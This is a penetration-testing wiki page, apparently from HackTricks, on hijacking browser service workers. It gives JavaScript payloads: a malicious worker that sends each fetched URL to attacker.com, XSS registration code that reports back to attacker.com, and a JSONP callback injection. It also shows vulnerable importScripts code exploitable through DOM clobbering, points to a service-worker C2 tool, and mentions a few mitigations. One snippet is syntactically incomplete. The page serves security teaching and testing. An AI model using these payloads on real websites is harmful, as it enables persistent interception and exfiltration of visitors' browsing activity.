_body: "# Abusing Service Workers\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Information\n\nA **service\
  \ worker** is a script run by your browser in the background, separate from any web page, enabling features that don't require\
  \ a web page or user interaction, thus enhancing **offline and background processing** capabilities. Detailed information\
  \ on service workers can be found [here](https://developers.google.com/web/fundamentals/primers/service-workers). By exploiting\
  \ service workers within a vulnerable web domain, attackers can gain control over the victim's interactions with all pages\
  \ within that domain.\n\n### Checking for Existing Service Workers\n\nExisting service workers can be checked in the **Service\
  \ Workers** section of the **Application** tab in **Developer Tools**. Another method is visiting [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)\
  \ for a more detailed view.\n\n### Push Notifications\n\n**Push notification permissions** directly impact a **service worker's**\
  \ ability to communicate with the server without direct user interaction. If permissions are denied, it limits the service\
  \ worker's potential to pose a continuous threat. Conversely, granting permissions increases security risks by enabling\
  \ the reception and execution of potential exploits.\n\n## Attack Creating a Service Worker\n\nIn order to exploit this\
  \ vulnerability you need to find:\n\n- A way to **upload arbitrary JS** files to the server and a **XSS to load the service\
  \ worker** of the uploaded JS file\n- A **vulnerable JSONP request** where you can **manipulate the output (with arbitrary\
  \ JS code)** and a **XSS** to **load the JSONP with a payload** that will **load a malicious service worker**.\n\nIn the\
  \ following example I'm going to present a code to **register a new service worke**r that will listen to the `fetch` event\
  \ and will **send to the attackers server each fetched URL** (this is the code you would need to **upload** to the **server**\
  \ or load via a **vulnerable JSONP** response):\n\n```javascript\nself.addEventListener('fetch', function(e) {\n  e.respondWith(caches.match(e.request).then(function(response)\
  \ {\n    fetch('https://attacker.com/fetch_url/' + e.request.url)\n});\n```\n\nAnd this is the code that will **register\
  \ the worker** (the code you should be able to execute abusing a **XSS**). In this case a **GET** request will be sent to\
  \ the **attackers** server **notifying** if the **registration** of the service worker was successful or not:\n\n```javascript\n\
  <script>\nwindow.addEventListener('load', function() {\nvar sw = \"/uploaded/ws_js.js\";\nnavigator.serviceWorker.register(sw,\
  \ {scope: '/'})\n  .then(function(registration) {\n    var xhttp2 = new XMLHttpRequest();\n    xhttp2.open(\"GET\", \"https://attacker.com/SW/success\"\
  , true);\n    xhttp2.send();\n  }, function (err) {\n    var xhttp2 = new XMLHttpRequest();\n    xhttp2.open(\"GET\", \"\
  https://attacker.com/SW/error\", true);\n    xhttp2.send();\n  });\n});\n</script>\n```\n\nIn case of abusing a vulnerable\
  \ JSONP endpoint you should put the value inside `var sw`. For example:\n\n```javascript\nvar sw =\n  \"/jsonp?callback=onfetch=function(e){\
  \ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url)\
  \ }) )}//\"\n```\n\nThere is a **C2** dedicated to the **exploitation of Service Workers** called [**Shadow Workers**](https://shadow-workers.github.io)\
  \ that will be very useful to abuse these vulnerabilities.\n\nThe **24-hour cache directive** limits the life of a malicious\
  \ or compromised **service worker (SW)** to at most 24 hours after an XSS vulnerability fix, assuming online client status.\
  \ To minimize vulnerability, site operators can lower the SW script's Time-To-Live (TTL). Developers are also advised to\
  \ create a [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)\
  \ for rapid deactivation.\n\n## Abusing `importScripts` in a SW via DOM Clobbering\n\nThe function **`importScripts`** called\
  \ from a Service Worker can **import a script from a different domain**. If this function is called using a **parameter\
  \ that an attacker could** modify he would be able to **import a JS script from his domain** and get XSS.\n\n**This even\
  \ bypasses CSP protections.**\n\n**Example vulnerable code:**\n\n- **index.html**\n\n```html\n<script>\n  navigator.serviceWorker.register(\n\
  \    \"/dom-invader/testcases/augmented-dom-import-scripts/sw.js\" +\n      location.search\n  )\n  // attacker controls\
  \ location.search\n</script>\n```\n\n- **sw.js**\n\n```javascript\nconst searchParams = new URLSearchParams(location.search)\n\
  let host = searchParams.get(\"host\")\nself.importScripts(host + \"/sw_extra.js\")\n//host can be controllable by an attacker\n\
  ```\n\n### With DOM Clobbering\n\nFor more info about what DOM Clobbering is check:\n\n\n{{#ref}}\ndom-clobbering.md\n{{#endref}}\n\
  \nIf the URL/domain where that the SW is using to call **`importScripts`** is **inside a HTML element**, it's **possible\
  \ to modify it via DOM Clobbering** to make the SW **load a script from your own domain**.\n\nFor an example of this check\
  \ the reference link.\n\n## References\n\n- [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)\n\
